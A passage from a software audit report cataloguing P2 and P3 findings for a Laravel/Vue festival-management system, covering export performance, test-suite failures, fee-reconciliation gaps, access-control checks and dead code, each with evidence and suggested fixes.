**`TECH-08[TechAudit]`** — No chunking anywhere in the ~7,600-line report/export layer. P2 · performance risk. Actual: a grep across all 8 report/export files for `chunk(`/`cursor(`/`LazyCollection` returns zero matches; `FestReportService::studentsCsv()` loads every active student across every school in the Sahodaya with no limit at all, while `auditLogRows()` elsewhere in the same file applies an explicit `->limit(5000)` — awareness of the risk exists in at least one place, applied inconsistently. Impact: for the largest realistic Sahodaya (hundreds of schools, tens of thousands of students across a district-level Kalolsavam), any of these exports risks high memory usage and long request/worker times with no fallback as the result set grows. Fix: convert the largest-result-set exports to `chunk()`/`cursor()` with a streamed writer — the HTTP-layer streaming is already in place; only the underlying query needs to stop materializing everything via `->get()` first. Scope: medium. Dependencies: same theme as `EXP-05`.

**Named-Sahodaya loose ends (Audit 2 §4/§11, thinner source detail — status/severity as given, not independently re-derived):**

**`WYN-06`** — Wayanad's tier lookup is only exercised for 2 of 3 class-category tiers by a passing test. P2 · test_gap (corrected during Audit 2's own second pass from an earlier, wrong "resolves only ONE tier" claim). Actual: confirmed 2/3 (senior_secondary, secondary) exercised via real class-category derivation; the "other" tier and Wayanad's own stated 30,000/25,000/20,000 map are never run through real derivation by any existing test. Fix: add the missing tier case plus a case using Wayanad's actual figures. Scope: small. Dependencies: none.

**`FEE-05[Financial]`** — Event cancellation never updates or voids invoice rows. P2 · confirmed (design gap adjacent). Actual: no mechanism exists to mark a pre-cancellation invoice as no longer valid once the event is cancelled; `fest_event_invoices.status` may need a `void` value added. Fix: add the enum value and the update-on-cancel logic as part of the `EVT-01[Event setup]`/`FEE-01[Financial]` fix. Scope: small. Dependencies: sequenced after the P0 cancellation fix.

**`FEE-06[Financial]`** — Per-head overpayment reconciliation does not fire automatically at approval, unlike every other billing model. P2 · confirmed gap in consistency (the mechanism is called out explicitly in Audit 2's own required-regression-tests list as needing to "fire automatically... matching every other billing model," implying it currently doesn't for the per-head path specifically). Fix: align the per-head approval path with the other billing models' automatic reconciliation. Scope: small–medium. Dependencies: none.

**Test execution (Audit 3 §7, full detail in §20):**

**`SUM-01`** — Full-suite test-run summary itself is a findable artifact. P2 · test_gap. This is the source dataset's own meta-finding for its full-suite numbers (809 tests/792 passed/16 failed in the source run; this pass's independent fresh re-run got 813/792/18 — see §20 for the complete reconciliation). Treated here as a catalog entry because the delta between two runs of the "same" suite is itself informative: `passed=792` was identical both times, meaning no previously-passing test newly broke; the entire delta is additive (new tests added to the working tree between runs, 2 of which fail under full-suite ordering — see the new Grade-banding finding below). Fix: N/A — this is a process/tracking finding, not a code fix. Scope: N/A. Dependencies: none.

**`TECH-01[TestExec]`** — `php artisan test` OOM-crashes under the default 128MB memory_limit, and `-d memory_limit=1G` does not fix it. P2 · performance risk. Actual: the documented, standard invocation crashes deterministically with `PHP Fatal error: Allowed memory size of 134217728 bytes exhausted`; prefixing `php -d memory_limit=1G` does **not** fix it, because `artisan test` forks a child PHPUnit process that does not inherit the parent CLI's `-d` override in this Laravel install. Independently re-run fresh this pass: identical crash, identical 134217728-byte figure, confirmed even with the `-d` prefix. Running `vendor/bin/phpunit` **directly** with `-d memory_limit=1G` does not crash. Fix: raise the repo's default testing `memory_limit`, or standardize documentation/CI on invoking `vendor/bin/phpunit` directly with a higher limit. Scope: trivial (config/docs). Dependencies: none — but blocks anyone following the documented command literally, see §20.

**`TG-08`** — `TeacherTrainingEligibilityServiceTest::test_region_ids_via_school_assignment` fails and the root cause is genuinely unresolved. P2 · test_gap, explicitly flagged as possibly a real bug, not assumed benign. Actual: `Failed asserting that false is true.` Both the source audit and this pass's independent fresh re-run reproduce the identical failure; neither determined why. Impact: concerns region-gated training-program eligibility (out of this series' Kalolsavam scope, but flagged because it should not be assumed benign without follow-up). Fix: needs a dedicated investigation outside this series' scope. Scope: unknown until investigated. Dependencies: none identified.

**`FE-TYPECHECK-01`** — No TypeScript/typecheck tooling exists at all. P2 · test_gap. Actual: no `tsconfig*.json`/`jsconfig*.json` at the repo root, no `typescript`/`vue-tsc` in `package.json` as a direct dependency, zero `.ts` files under `resources/` (the repo's only `.ts` file is `playwright.config.ts`), zero `lang="ts"` SFCs anywhere — a plain JavaScript Vue 3 + Inertia app with no static type analysis step. Fix: consider incremental TypeScript adoption for the highest-risk, currently-mid-refactor components. Scope: large if pursued. Dependencies: product/engineering-leadership decision on investment level.

**`FE-UNIT-01`** — No frontend unit-testing setup exists at all. P2 · test_gap. Actual: no `test`/`test:unit`/`vitest`/`jest` script in `package.json`, no config files, zero `*.spec.js`/`*.test.js` files anywhere outside `node_modules`/`vendor`. The only `*.spec.ts` files are the 10 Playwright **e2e** specs (browser-level, not component-level). Fix: consider Vitest coverage for the highest-risk display-logic components (`PhasedRegionBillingPanel.vue`, `FeesTab.vue`, `Settings.vue`, `ProgramHub.vue`, `Registration.vue` — all currently mid-refactor per the working tree). Scope: large if pursued. Dependencies: same decision as `FE-TYPECHECK-01`.

**`FE-E2E-01`** — E2E coverage is shallow page-load smoke checks only. P2 · test_gap. Actual: 45 tests across 10 spec files/10 projects; Fest/Kalolsavam-relevant coverage spans 4 files and is uniformly a shallow "page loads without a 500/redirect-to-login/visible-error-text/layout-overflow" check — no assertion anywhere checks fee amounts, phase transitions, report data values, or export file contents. Most fest-specific tests are wrapped in `test.skip()` guards keyed to `php artisan e2e:seed-data` having been run first; absent that, they silently skip rather than validate. Fix: if the e2e suite runs in CI, confirm the seed/provision commands actually execute in the pipeline before fest-tagged specs run — otherwise those specs pass by skipping, not by validating, behind a green checkmark. Scope: medium (process verification) to large (deeper assertions). Dependencies: none.

**`GRADE-BAND-01`** — `FestGradePointServiceGenericConfigTest` passes in isolation but 2 of 4 tests fail under full-suite ordering, in currently-uncommitted grade-banding code. P2 · confirmed bug (test-isolation/pollution) · **new finding, not part of either source audit's numbered lists — discovered only by this synthesis's own predecessor (Audit 3) freshly re-executing the suite rather than transcribing prior results.** Tenant: any (this is in the uncommitted working tree, not yet shipped). Actors: any Sahodaya Admin using grade-banding once this feature ships. Expected: `test_raw_score_bands_resolve_highest_match_regardless_of_storage_order`/`test_item_specific_band_takes_priority_over_event_wide` should pass consistently. Actual: `git diff --stat` confirms `FestGradePointService.php`/`FestGradeConfig.php` are currently modified and uncommitted (44 and 4 lines) — an in-progress percentage-of-`total_marks` grade-banding feature layered on a documented prior fix. Run in isolation: `OK (4 tests, 12 assertions)`. Run as part of the full suite: the first 2 of those 4 tests fail (`Failed asserting that null is identical to 'A'`/`'A+'`) — both exercise the **raw-score** (non-percentage) banding path; the 2 percentage-based tests pass in both contexts. This pass/fail divergence between isolated and full-suite runs is the classic signature of shared mutable state leaking across tests (a static property, memoized config, or non-reset container singleton), not a straightforwardly-wrong implementation. The exact pollution source (which earlier test in suite order is responsible) was not bisected. Evidence: `app/Services/Events/FestGradePointService.php`, `app/Models/FestGradeConfig.php` (both modified, uncommitted); `tests/Unit/Services/Events/FestGradePointServiceGenericConfigTest.php` (untracked, 4 test methods). Impact: low today — uncommitted, in-progress work not yet part of any shipped grading behavior — but (a) a commit right now would ship broken, and (b) the isolation-vs-full-suite divergence is a signal worth investigating on its own, since if something in the suite is leaking state, other tests could be silently passing for the wrong reason too. Fix: before committing, investigate a static/memoized value on `FestGradePointService` or a `FestGradeConfig` query result not reset between tests. Tests: do not commit this change without both isolated and full-suite runs green. Scope: small (bisection + fix) once investigated. Dependencies: blocks the in-progress grade-banding feature from being safely committed.

**On Audit 2's exact P2 total:** the severity table on the cover of Audit 2 states 28 P2s; the entries above account for the ones this synthesis pass found full prose detail for. A small remainder (Audit 2 synthesizes 71 findings, several of which — e.g. `KOCHI-04`, `WYN-04`, `WYN-05`, `MLB-03`, `MCS-04` — appear only as one-line regression-test call-outs in that document's own §11, without independent prose describing the underlying gap) is intentionally not force-fit into full 17-field entries here rather than fabricated; each is captured instead in §16 (test coverage gaps) or §18's roadmap by name, so no finding ID from any source document is silently dropped, per this task's own accuracy requirement.

---

### 9.4 P3 — 84 findings (compact card format: dead code, cosmetic gaps, documentation drift, test gaps on otherwise-correct code, and confirmed-working "not a gap" positives, kept for completeness)

**Event setup, competition setup (Audit 1 §6.1–6.2):**

**`EVT-04[Event setup]`** — Status transitions correctly guarded on both write paths. P3 · not_a_gap. `FestEventController::update()`/`quickStatus()` both call the identical `StatusTransitionGuard`. Evidence: `php artisan test --filter=FestEventUpdateRespectsTransitionGuardTest` → 2/2 passed. No action needed.

**`EVT-05[Event setup]`** — Phase-mode lifecycle write paths and effective-lifecycle resolution both correct. P3 · not_a_gap. `FestEventPhaseController::update()`/`quickStatus()` and `FestPhaseLifecycleService::effectiveLifecycleForItem/Phase()` all confirmed correct, including fail-closed behavior for a phase belonging to another event. Evidence: `FestEventPhaseLifecycleTest` → 5/5 passed. No action needed.

**`CS-06`** — Custom competition types work correctly, with correct tenant scoping. P3 · not_a_gap. `FestCompetitionTypeRegistryTest` → 6 tests, 19 assertions passed; `update()`/`destroy()` correctly `abort_if` on cross-tenant access. No action needed.

**`CS-07`** — Eligibility rule controller correctly rejects cross-tenant access and mismatched scope. P3 · not_a_gap. `store()`/`update()`/`destroy()` all lead with tenant checks; `assertScopeBelongs()` re-derives scope validity from the DB rather than trusting client-submitted ids. Code-inspection-confirmed; `grep` for tests of this controller returns zero — itself a coverage gap worth closing even though the logic reads correctly. Tests: none. Scope: small if added.

**School registration (Audit 1 §6.3):**

**`SCHREG-05`** — A region-scoped admin can verify documents for a school outside their assigned region. P3 · confirmed. `FestSchoolVerificationController::verify()` only checks same-tenant, never the school's actual region assignment, even though the controller inherits a ready-made `regionScopedSchoolIds()` helper from its own base class already used by `FestReportController`. Reproduced live: region_admin scoped to Region 1 marked "documents verified" for a Region 2 school. Impact: low severity — no data read/leaked, only an incorrect write to a low-stakes flag. Fix: call the already-inherited helper and abort if empty. Tests: none. Scope: trivial.

**`SCHREG-06`** — No way for a school to save an in-progress roster and return to it later. P3 · design_gap. Every `FestRegistration` writer creates a live-submission-status row (`'submitted'`/`'approved'`); no writer ever sets `'draft'`. In-progress selection exists only as client-side Vue form state, lost on tab/session loss. Fix: add periodic autosave to a draft-status row if desired; at minimum remove the dead `'draft'` branch from `FestRegistrationApprovalService`'s status filter. Scope: medium if built, trivial for the dead-branch cleanup alone.

**`SCHREG-07`** — No late-registration/grace-period/override mechanism anywhere in the Fest module. P3 · design_gap. `EventLifecycleGate::allowRegistrationForItem()` has no `$override` parameter at all, unlike its sibling `allowRegistrationReview(..., bool $override=false)`. The only way to accept a late entry today is to widen the item/event's window, register, then reset it — no explicit, audited "late registration" action exists. Fix: document as intentional (fairness-by-design), or add an explicit override flag mirroring the review flow's existing pattern. Product decision — §17.

**`SCHREG-08`** — Resubmission after rejection works correctly, backend and frontend both. P3 · not_a_gap. `canSchoolEditRoster()` explicitly includes `'rejected'`; the Vue UI's own `canEdit()` independently allows it too. One prior internal doc (`Documents/Path_breaks.md`) is self-contradictory on this point; direct reading of current code confirms the "Fixed" entry is accurate, the earlier "still open" entry is stale. No action needed.

**Event operations (Audit 1 §6.4):**

**`Event-ops EVT-05` + `NAV-03`** — The `fest.discipline` middleware is fully implemented but wired to zero routes. P3 · confirmed **(merged — see §1.3)**. `EnsureFestDisciplineAdmin.php` is fully functional (checks `FestEventStaff duty='discipline'`) but appears in no route file anywhere except its own `bootstrap/app.php:60` registration. The "discipline" duty itself is real and assignable through the UI ("Event Head admin" / "Discipline / item head admin" picker), granting today only the same generic `fest_ops` access every other duty gets. Impact: zero data-exposure risk since nothing depends on the dead middleware — purely a discoverability/expectation-consistency gap. Fix: wire the middleware onto the discipline-scoped admin route it was meant to protect, or remove the dead alias and the duty-specific UI branch if the ops portal's `dutyNav` now fully serves this duty. Scope: small either way.

**`Event-ops EVT-06`** — Chest number/registration number generation is race-safe under concurrent requests. P3 · not_a_gap. `FestNumberingService`'s numbering methods each correctly wrap `lockForUpdate()` inside `DB::transaction()` before computing `MAX()+1` — standard pessimistic locking, closing specific prior duplicate-number races documented in inline comments. No action needed.

**Marks and results (Audit 1 §6.5):**

**`Marks EVT-06`** — Grade calculation correctly returns the highest matching band. P3 · not_a_gap. `FestGradePointService::highestMatchingBand()` sorts bands high-to-low and returns on first match. Evidence: `FestGradePointServiceTest` → 2 tests, 16 assertions passed. (Contrast with `GRADE-BAND-01`, §9.3 — the *new*, currently-uncommitted percentage-banding feature, a different code path than this confirmed-correct existing one.)

**`Marks EVT-07`** — Tie-break modes and the hub-level publish lock both work as designed. P3 · not_a_gap. `FestQualificationTiebreakTest` → 4/4 passed; a scratch test independently confirmed the hub-level lock (a mark-entry POST after `results.publish` under the strict flag correctly 422s).

**`Marks EVT-08`** — No time-bound mark-entry window exists anywhere; gating is a manual boolean plus a coarse status allow-list. P3 · design_gap. No `scoring_open`/`scoring_close`-style fields exist in the schema or code, asymmetric with registration's real Carbon-based windows. All 6 real mark-entry call sites correctly call the gate that does exist. Impact: staff can enter/alter marks at any point in a broad event status, relying on someone manually toggling `scoring_locked` — low risk since only privileged roles reach these endpoints. Fix: add `scoring_open_at`/`scoring_close_at` if a true window is desired. Product decision — §17.

**Qualification and promotion (Audit 1 §6.6):**

**`QUAL-05`** — The lot-draw tie-break's recorded "seed" has zero causal effect on the actual draw. P3 · confirmed. A UUID `seed` is recorded, then `$contested->shuffle()` — a zero-argument call — is invoked; the installed Laravel's `Collection::shuffle()` takes no seed parameter and uses a fresh `Randomizer` internally. Reproduced: forcing an identical seed via `Str::createUuidsUsing()` across 8 runs of an identical tie still produced 3 different outcomes. Impact: if a school disputes a lot-draw result, the stored `seed` cannot actually reproduce/prove the draw was fair — not a fairness bug in the draw itself, only in the false reproducibility the field implies. Fix: seed a dedicated seedable RNG for real reproducibility, or relabel the field as a non-reproducible draw identifier. Tests: `FestQualificationTiebreakTest` has zero `lot_draw` coverage.

**`QUAL-06`** — Promotion from a region-partitioned hub correctly aggregates across all partition children. P3 · not_a_gap. `promoteWinners()` auto-detects `isPartitionedHub()` and expands via `FestPartitionService::partitions()`. Reproduced: a hub with zero items of its own but a region-child carrying real data correctly promoted the winner with `event_id` pointing at the region child, not the hub. Recommendation: add a permanent regression test locking this in, since it was previously verified only by manual reproduction, not a committed test.

**`QUAL-07`** — Batch promotion is not transactional; a manual-tie-break abort leaves earlier items already committed with no summary. P3 · confirmed. `promoteWinners()` has zero `DB::transaction`/try-catch around its per-item loop; a manual-mode tie-break abort partway through leaves already-processed items committed and unprocessed items never attempted, with the 422 response naming only the blocking item. Reproduced with a real 3-item event: item A's qualification+promotion were committed, item C was never reached, and the response named only item B. Impact: an admin cannot tell from the response alone whether it's safe/necessary to re-run. Fix: wrap the loop in a transaction (if all-or-nothing is desired) or catch the abort per item and return a combined `{promoted, skipped, blocked}` result. Tests: none exist for this partial-application scenario.

**Certificates (Audit 1 §6.7):**

**`CERT-05`** — Post-completion lockdown correctly enforced, with a deliberate documented exception. P3 · not_a_gap. Mark entry, registration review, and event deletion (with real data) are all correctly blocked once `status='completed'`; `StatusTransitionGuard` treats `completed` as terminal from both write paths; `unpublish()` is the one deliberate, tested exception (its only real shortcoming is `CERT-02`/`SEC-04[Lifecycle]`'s certificate/qualification-revocation gap, not this lockdown mechanism). Evidence: `FestEventUpdateRespectsTransitionGuardTest` (2/2), `LifecycleNotificationCascadeTest` (5/5, 17 assertions).

**Data integrity (Audit 1 §6.8):**

**`DATA-03`** — Mark-save services rely on caller discipline for lifecycle gating rather than self-enforcing it. P3 · design_gap. Neither `FestMarkSaveService::save()` nor `FestJudgeScoreService::save()` calls `EventLifecycleGate` internally; all 6 current call sites do call it correctly immediately before saving, so there is no live bug today. Impact: a future call site (or a reordering refactor) could invoke the save service without the gate, silently accepting marks for a scoring-locked or out-of-window event. Fix: move the gate call inside the save services themselves, mirroring how item/participant ownership is already self-enforced.

**`DATA-04`** — Duplicate participants and duplicate individual chest numbers are impossible, enforced by real DB constraints. P3 · not_a_gap. `fest_participants_registration_student_unique` and `fest_participants_event_head_chest_unique` are real, driver-independent unique constraints, confirmed present on SQLite (not Postgres-only). Note: this is specifically about *individual* participants — the equivalent protection for *team/group* chest numbers is the gap `DATA-02`/`TECH-01[TechAudit]` describe.

**`DATA-05`** — Marks/judge-scores for a mismatched item/participant/registration are rejected uniformly across every entry surface. P3 · not_a_gap. All mark-entry surfaces funnel through the same two shared services, which independently check ownership before writing. Evidence: `FestMutationInvariantTest` → 6/6 passed, 13 assertions.

**`DATA-07`** — Registration deadlines and student eligibility are both enforced unconditionally before any write. P3 · not_a_gap. `FestItemRegistrationGate::assertOpen()` and `FestRegistrationEligibilityService::validateStudents()` are both called unconditionally inside the transaction before any write. Evidence: `FestItemWindowResolverTest` (3/3), `FestRegistrationEligibilityServiceTest` (10/10, 15 assertions).

**`DATA-08`** — Team/group squad-size validation works correctly, but has zero test coverage. P3 · test_gap. `FestTeamSquadRules::validateCount()` is invoked unconditionally on both create and update; a scratch test against `min_group_size=3`/`max_group_size=5` confirmed correct rejection below/above and correct acceptance within range — but no permanent test exercises rejection at all (only `isMultiPerson()`/`defaultSizeFor()` are covered). Fix: add a focused permanent test.

**UI/navigation — School Admin (Audit 1 §6.9):**

**`UI-School EVT-04`** — The "Promoted qualifiers" report tile's Preview and CSV-export links are both dead, via two separate causes. P3 · confirmed. `ReportEventHub.vue`'s local `previewHref()` reimplementation ignores `report.externalPath` and always builds a wrong nested path; the CSV-export bug is separate and lives *inside* a different shared helper (`schoolReportDataHref()` in `festReportCatalog.js`), which also never checks `externalPath` — fixing only the component would fix Preview but not the export. Impact: low severity — the feature remains reachable via the sidebar's own correctly-wired direct "Qualifiers" link. Fix: add an `externalPath` branch to `schoolReportDataHref()`/`schoolReportPdfHref()`; switch the component's `previewHref()` to call the existing correct helper, `schoolReportHref()`.

**`UI-School EVT-05`** — Page-loader resolution, safe-report allowlist, and program-scoping are solid in this slice — but not a blanket clean bill. P3 · not_a_gap, with an explicit caveat. An independent extraction across all 11 SchoolAdmin fest controllers found 44/44 render targets resolve to real files; `isSchoolSafe()`'s fail-closed gate, `SINGLE_PROGRAM_ROLES`, and the food-billing payee-snapshot pattern are all confirmed correct. However, this finding's own "clean" controller list omits `FestSubstitutionRequestController` by name even though its render targets were counted — and `UI-School EVT-01` (§9.2) shows that exact controller is missing a real, sibling-inconsistent authorization check. Read as: the specific verified claims are accurate; do not read as "this slice has no other gaps."

**Sahodaya Admin navigation (Audit 1 §6.10):**

**`NAV-SEC-02`** — Event-scoped fest routes correctly deny out-of-scope events, including tampered query params. P3 · not_a_gap. The genuine positive counterpart to `NAV-SEC-01` (§9.2) — the gap there is specifically the non-event-scoped surface, not this one. `event_admin` denied a FestEvent it isn't assigned to; `region_admin` denied a region-partitioned child outside its region, including via a hub-with-no-region-picked and tampered `region_id`/`school_id` query params. Evidence: `RegionScopedAccessParityTest` (5/5, 12 assertions), `RegionAdminReportContainmentTest` (9/9, 59 assertions), both confirmed to make substantive, non-tautological assertions (sentinel-named data checked by name).

**`NAV-04`** — Two independently-drifted definitions of which permissions unlock the Finance/Ledger sidebar section. P3 · confirmed. `SahodayaAdminLayout.vue`'s `STAFF_NAV.ledger` (the one actually used at runtime) lists 3 permissions; `TenantUserCatalog::sahodayaNavPermissions()['ledger']` (a separate, unused PHP helper) lists those 3 plus an extra `fest.finance` — `grep` confirms zero callers of the PHP helper, so it's dead code, not a live inconsistency, but a maintenance trap if a future change wires it back in. Fix: delete the dead PHP helper, or have the Vue layout consume an Inertia-shared version of the PHP map so there is exactly one definition.

**`NAV-05`** — "ID card templates" is the one Fest nav item that can never be hidden via sidebar-visibility settings. P3 · confirmed. Of 10 total `menuOn()` calls in the nav config, 9 have a matching `SahodayaNavVisibility::menuLabels()` entry; `id_card_templates` is the sole exception, and an unset key defaults to visible. Fix: add the missing `menuLabels()` entry.

**`NAV-06`** — Fee-proof rejection notification works correctly; a prior audit doc's claim on this is stale. P3 · not_a_gap. `Documents/Path_breaks.md` claims fee-proof rejection never notifies the school ("still open"); `reject()` in fact calls a real, functioning notifier (queries every non-portal-local-email user of the school tenant, sends via mailer, wrapped in try/catch so a mail failure doesn't fail the request). Recommendation: update the stale doc line; pair the correction with a small regression test, since the working code currently has zero automated coverage protecting it.

**State Admin (Audit 1 §6.11):**

**`SA-05`** — A dead duplicate `Pages/StateAdmin/**` Vue tree keeps receiving matching edits, reproducing the exact mechanism that once caused a real blank-page outage. P3 · confirmed. `admin.js`'s glob root excludes `./Pages/StateAdmin/**` (one directory up from the live `./Pages/Admin/StateAdmin/**`), making it structurally unreachable; all 6 files in both trees are currently byte-identical, but `git log` on the dead tree shows exactly one commit — the day before Audit 1 ran — whose diff shows 4 unrelated controller fixes plus all 6 dead-tree Vue files as pure insertions, with the live copies untouched by that same commit. Impact: currently harmless (both trees are in sync), but nothing prevents a future commit from touching only the dead copy, or a cleanup accidentally deleting the live one. Fix: delete the confirmed-unreachable tree; consider a CI check failing the build on any `.vue` file outside the glob roots the bundles actually use.

**`SA-06`** — State/Super Admin nav links and Results/Winners buttons all resolve correctly. P3 · not_a_gap, with a dependency caveat. Every nav path has a registered route; all 10 checked Inertia render targets exist; Results/Winners link gating (`['kids_fest','teacher_fest','custom']`) matches identically between two Vue files and the server-side constant. Relies on the same uncommitted `ExternalSchoolController` render-path fix flagged in `SA-01`/`SA-02` (§9.1) — the fix itself is correct, but per `git status` exists only in the working tree.

**Public/API (Audit 1 §6.12):**

**`PUB-04`** — Phase-gated public scoreboard/results correctly withhold unpublished-phase data. P3 · not_a_gap. Distinct code path from `PUB-02`'s bug (`schedule_published` vs. `results_published`). `FestPhaseScoreboardService::cumulativeOverall()` filters strictly on phase-level `results_published` before summing; `phaseBreakdown()` withholds the board array for an unpublished phase by design. Reproduced via 12 direct HTTP assertions on a 2-phase fixture — all passing, no leak.

**`API-02`** — Narrow-permission staff are blocked from registration approve/reject identically on web and API. P3 · not_a_gap. `SahodayaAdminController`'s constructor runs the identical permission check `EnsureSahodayaAdminApi` runs, just in a different layer (base-controller constructor vs. middleware). Reproduced: a `certificate_collector`-only-permissioned account attempting approve on both surfaces got 403 both times. Maintainability-only observation: the two enforcement points living in different classes could drift if one is edited without the other.

**`TEN-01`** — Cross-school/cross-tenant registration and external-portal writes are correctly blocked, with a real service-layer guard as the actual first line of defense. P3 · not_a_gap. A per-student `abort_if($student->tenant_id !== $school->id, 403)` inside the registration service's per-student loop is the actual first-line guard (found during independent re-verification, not identified by the original claim), well before any write; external portal controllers resolve the acting entity purely from a URL access-code/session, never client-supplied IDs. Reproduced live: a cross-school registration attempt returned 403, zero rows created. Low-priority hardening suggestion: tighten `store()`'s validation rules to a tenant-scoped `Rule::exists()` so a cross-school payload fails cleanly at validation time instead of relying on the deeper service-layer guard as the sole backstop.

**Named-Sahodaya and fee-catalog P3s (Audit 2 §4/§7/§8; status/one-liner as the source audit itself gives them):**

**`KOCHI-03`** — `extra_item_fee` schedule key is dead for no-head-id items. P3 · confirmed. `extra_item_fee=250` configured, no `default_item_fee`, item beyond quota, no `head_id`: expected ₹250, resolved to ₹0. Real code gap but unreachable via any admin UI path today (no normalizer surface can set this specific combination). Fix: low priority given unreachability; fix alongside `FEE-08[Precedence]` if the sports-fee surface is reworked.

**`KOCHI-05`** — Fee recalculation on registration cancel/withdraw is correct and atomic. P3 · confirmed, working. The student's quota slot is released, then `recalculate()` runs, both inside the same DB transaction. Only gap: `FestRegistrationService::cancel()` is exercised by 2 existing tests, neither of which asserts `total_due` actually drops afterward. Fix: add the assertion to existing tests.

**`KOCHI-06`** — Kochi Metro's "membership renewal ₹0" is legitimate and independently configured. P3 · confirmed, not a bug. Lives in a wholly separate subsystem (`MembershipFeeCalculator`/`SahodayaProfile.membership_fee_type`) with zero code coupling to the event-registration fee — a school can have ₹0 membership and a non-zero event fee, or vice versa; there is no shared code path to get this wrong.

**`MLB-05`** — Methodology note: `cksc_tiered` tests are not the right anchor for verifying Malabar's rule. P3 · not_a_gap. A different tiering axis (by class category, not student count); the `student_count_slab` tests are the correct anchor, and that's what `MLB-01`/`MLB-02` correctly relied on.

**`MCS-07`** — Data-model clarification: "Level" = `FestRegistrationBatch`, "Phase" = `FestEventPhase`. P3 · not_a_gap. Each phase has an FK to exactly one batch; one batch owns many phases. `docs/MCS_FOUR_PHASE_COMPLETION_PLAN.md` (2026-08-16) is authoritative over the earlier `docs/KALOTSAV_PHASED_LEVEL_FEE_PLAN.md` (2026-08-15) wherever the two conflict, since current code implements the former.

**`MCS-06`** — `test_mcs_two_level_registration_notice`'s name doesn't match the mechanism it actually exercises. P3 · test gap–adjacent. The test exercises the older per-phase-share mechanism, not the batch+phase mechanism that would actually run in production for MCS. Fix: rename or replace the test so its name accurately describes MCS's real billing mechanism.

**`FEE-07[Catalog]`** — Qualification-triggered fee change / GST / cess / tax capability. P3 · confirmed absent. Zero references anywhere in `app/` — reads as scope that never existed, not a regression. No fix needed unless product requests it — §17.

**`FEE-02[Catalog]` / `FEE-04[Precedence]` / `FEE-08[Snapshot]`** — `fest_school_event_fees.override_amount` column is fully dead. P3 · confirmed (dead), independently re-confirmed 3 separate times across 3 different Audit 2 sections (an intra-Audit-2 triple-find, analogous to the intra-Audit-3 duplicate pairs in §1.3). Fillable and cast, but no code path anywhere writes to it as a model attribute. Fix: decide its fate — wire it into `feeTotalDue()`/`recalculate()` and expose an admin UI control, or drop the column outright. Product/engineering decision, not urgent either way.

**`FEE-06[Catalog]`** — The Fest fee-credit cash payout mechanism genuinely exists and works end-to-end. P3 · not_a_gap — an earlier pass had wrongly flagged this as missing; `CreditPayoutService` → real ledger entries crediting CASH-BANK, wired to a working admin UI form, verified with a fresh scratch test (`CreditPayout=500; CASH-BANK +500; FEE-CREDIT-PAYABLE −500`, all exactly ₹500). Only gap: zero coverage in the *permanent* test suite. Fix: promote the scratch test.

**`FEE-08[Catalog]`** — The bulk of the fee catalog (28 other scenarios across sports/composite/tiered/gating models) is implemented and tested. P3 · not_a_gap — positive baseline. 67 tests/209 assertions re-run clean across 4 suites in this Audit 2 pass. Treat as the regression baseline this document's other fee findings are exceptions to.

**`FEE-01[Hardcoded]`** — No hard-coded Sahodaya-identity branching anywhere in fee-computation code. P3 · not_a_gap. Checked via direct full reads of every fee-resolution file plus repeated independently-re-run greps for tenant slug/id/name comparisons against all 8 candidate Sahodaya names — zero matches. Onboarding any of the 5 named Sahodayas requires zero fee-logic code changes, only per-tenant configuration rows. Recommendation: an optional lightweight CI grep step flagging any future tenant-identity comparison introduced in fee-adjacent code, as a guardrail (not because one exists today).

**`FEE-03[Hardcoded]`** — `'cksc_tiered'`/`'kalolsavam_composite'` are fee-model-type selector values, not tenant-identity checks. P3 · not_a_gap. A plausible false-positive grep pattern — any Sahodaya can independently choose either model; these are not identity branches.

**`FEE-04[Hardcoded]`** — Two literal `'MCS'` string fallbacks in `MembershipReceiptService::renderPreview()` are inert. P3 · not_a_gap. Both are sample-data defaults inside an admin-only style-preview endpoint; `MembershipReceiptTemplate::resolve()` always sets the real value first — neither reaches a real school's actual receipt.

**The one real, related risk in this section — not identity-based hardcoding, but an inconsistent default:** `FEE-02[Hardcoded]` (unconfigured sports vs. Kalolsavam events behave asymmetrically) is presented in full at §9.3 (P2), since it's a real, actionable behavioral gap rather than a confirmatory "not a gap" note.

**Reports, security, export quality, technical, and test-execution P3s (Audit 3 §1/§3/§4/§5/§6/§7 — 28 entries):**

**`RPT-05`** — Judge/staff "assignment list" reports don't exist beyond the live CRUD screen. P3 · report mismatch. `RPT-TCH-011`/`RPT-KAL-003`/`RPT-SPT-022` are cataloged in the ERP Reports Hub as available/"retain," but `FestJudgeAssignmentController`/`FestEventStaffController` expose only `index`/`store`/`destroy` — no export method; the only catalog id containing "judge" is a per-item blank scoring sheet, not a roster. Impact: a Sahodaya cannot print "who is judging/staffing what" for an event day — staff must manually retype or screenshot the live admin page. Fix: add a real export and register it, or correct the ERP catalog's note text.

**`RPT-06`** — No distinct-student headcount. P3 · report mismatch. `participationCounts()` computes `$regs->count()` over registrations — a student entered in 3 items is counted 3 times; no `distinct student_id` computation exists anywhere in the analytics layer. Fix: add a distinct-`student_id` count to Participation Counts, computed from the already-loaded collection.

**`RPT-07`** — No itemized refunds/adjustments register. P3 · missing feature. Fest refunds are modeled only as `FestFeeCredit` balances, surfaced solely as one Sahodaya-wide aggregate number on the Finance Hub dashboard; zero `fee-credit` routes exist, zero `FestFeeCredit` references exist in the report catalog. By contrast the waiver register genuinely is Sahodaya-wide and itemized — the asymmetry this finding relies on. Fix: add an itemized `FestFeeCredit` register mirroring the waiver-register pattern.

**`RPT-08`** — Accommodation/lodging is entirely absent — a feature gap, not just a reporting gap. P3 · missing feature. Food/catering is fully built (dedicated controllers, ~18 routes, real export ids); `grep -rln "lodging|hostel|boarding" -i` returns exactly one match, and it's the word "onboarding" in an unrelated comment. Out of scope to build within an audit; flagged for product prioritization.

**`RPT-09`** — "School-strength-category" report/banding. P3 · **product decision required** (relabeled from the source's `missing_feature` tag per the finding's own recommendation text) — see §17.2 for the full discussion. No such concept exists in Fest reporting/fee code; the only "strength banding" anywhere belongs to a different module (membership subscription fees). `age-group-matrix`/`category-wise-students` are the closest Kalolsavam analogs (age/class-category banding, not enrollment size).

**`RPT-10`** — The bulk of the requested report inventory is solid. P3 · not_a_gap (confirmatory, sampling-based, not exhaustive — see §16 unverified areas). School/student registration, participation, rosters, chest numbers, ID cards, attendance, schedule, clash report, mark-entry status, results, rankings, points, promotions, appeals, certificate counts all confirmed present, scoped, and backed by real export formats. Treat as the regression baseline for §8/§14's other specific gaps.

